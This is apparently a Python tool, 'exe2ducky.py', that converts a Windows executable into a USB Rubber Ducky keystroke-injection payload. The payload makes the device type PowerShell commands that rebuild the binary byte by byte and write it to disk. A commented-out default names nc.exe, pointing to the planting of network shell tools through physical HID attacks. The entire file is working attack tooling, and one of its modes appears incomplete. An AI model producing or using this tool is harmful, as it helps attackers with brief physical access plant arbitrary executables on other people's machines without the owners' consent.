#!/bin/python

import os, sys, getopt
from os.path import exists

def main(argv):
   exefilename = ''
   injectfilename = ''
   mode = '1'
   try:
      opts, args = getopt.getopt(argv,"hi:o:m:",["ifile=","ofile=","mode"])
   except getopt.GetoptError:
      print ('exe2ducky.py -i <exefilename> [-o <injectfilename>] [-m mode]')
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print ('exe2ducky.py -i <exefilename> [-o <injectfilename>] [-m mode]')
         sys.exit()
      elif opt in ("-i", "--ifile"):
         exefilename = arg

      elif opt in ("-o", "--ofile"):
         injectfilename = arg

      elif opt in ("-m", "--mode"):
         mode = arg

   if exefilename.strip() == '':
      print ('exe2ducky.py -i <exefilename> [-o <injectfilename>] [-m mode]')
      print ('Missing exefilename')
      sys.exit(2)   

   if not exists(exefilename):
      print ('exe2ducky.py -i <exefilename> [-o <injectfilename>] [-m mode]')
      print ('exefilename ',exefilename,' not found')
      sys.exit(2)   

   if injectfilename.strip() == '':
      injectfilename = "inj."+exefilename
      
   #print ('Exe filename is: ', exefilename)
   #print ('Inject filename is: ', injectfilename)
   #print ('Mode is: ', mode)

#if __name__ == "__main__":
#   main(sys.argv[1:])
   
   delay="DELAY 2000"
   createfile="STRING $bytecode=New-Object byte[] "
   preprefix="STRING $bytecode["
   prefix="]=[convert]::ToByte("
   suffix=")"
   enter="ENTER"

   #exefilename='nc.exe' 
   size=os.path.getsize(exefilename)
   print ("REM Reading ",size," bytes")

   infile = open(exefilename,"rb")
   bytecode = list(infile.read())
   #print(bytecode[77503])
   infile.close()

   print(delay)
   print("STRING $start=date")
   print(enter)

   # Straight forward mode. Adds one line per byte.
   # Veeeery slow but reliable
   if mode == '1':
      index=0
      while index < size:
          injectline=preprefix + str(index) + prefix + str(bytecode[index]) + suffix
          print(injectline)
          print(enter)
          index += 1


   # Buffered mode. Adds one line per <buffer> bytes.
   # In the middle
   #
   # $bytecodetmp = 77, 90,144,3,0,....
   # $bytecode = $bytecode + $bytecodetemp
   if mode == '2':
      bufsize=512
      interdelay='200'
      index=0
      #injectline="$bytecodetemp = " 
      while index < size:
          bufindex=0
          injectline="STRING $bytecodetemp = $bytecodetemp + " 
          print("STRING # Progress: "+(str(int(100*index/size)))+"%, "+str(index)+" bytes")
#          print("$bytecode = $bytecode + $bytecodetemp")
          print(enter)
          while bufindex < bufsize and (index+bufindex) < size:
              #print(">>>"+str(index+bufindex))
              #print(str(index+bufindex)+"  "+str(bytecode[index+bufindex]))
              injectline=injectline + str(bytecode[index+bufindex])
              if not (bufindex == bufsize-1 or (index+bufindex) == size-1):
                   injectline=injectline + ','
              bufindex += 1
          print(injectline)
          print(enter)
#          print("STRING # Progress: "+(str(int(100*index/size)))+"%, "+str(index)+" bytes")
#          print("$bytecode = $bytecode + $bytecodetemp")
#          print(enter)
          print("DELAY "+interdelay)
              
          index += bufindex
      print("STRING # Progress: "+(str(int(100*index/size)))+"%, "+str(index)+" bytes")
      print(enter)
      print("STRING $end=date")
      print(enter)
      print("STRING $start")
      print(enter)
      print("STRING $end")
      print(enter)

      print("STRING [byte[]] $bytecode = $bytecodetemp")
      print(enter)
      print("DELAY "+interdelay)
      print("STRING [io.file]::WriteAllBytes('"+injectfilename+"',$bytecode)")
      print(enter)
if __name__ == "__main__":
   main(sys.argv[1:])


#powershell
#DELAY 2000
#STRING [io.file]::WriteAllBytes('notepad2.exe',$file)
#ENTER
#CertUtil -hashfile notepad2.exe MD5
#ENTER
